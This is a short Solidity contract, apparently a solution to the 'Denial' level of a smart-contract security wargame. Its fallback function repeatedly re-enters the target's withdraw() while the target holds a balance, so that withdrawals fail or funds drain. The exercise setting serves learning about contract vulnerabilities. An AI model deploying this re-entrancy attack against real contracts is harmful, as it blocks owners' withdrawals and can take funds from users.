// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial d;
    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        d = Denial(contractAddress);
    }

    //Code me!
    fallback() external payable {
        if (d.contractBalance() > 0) {
            d.withdraw();

        }
    }
}
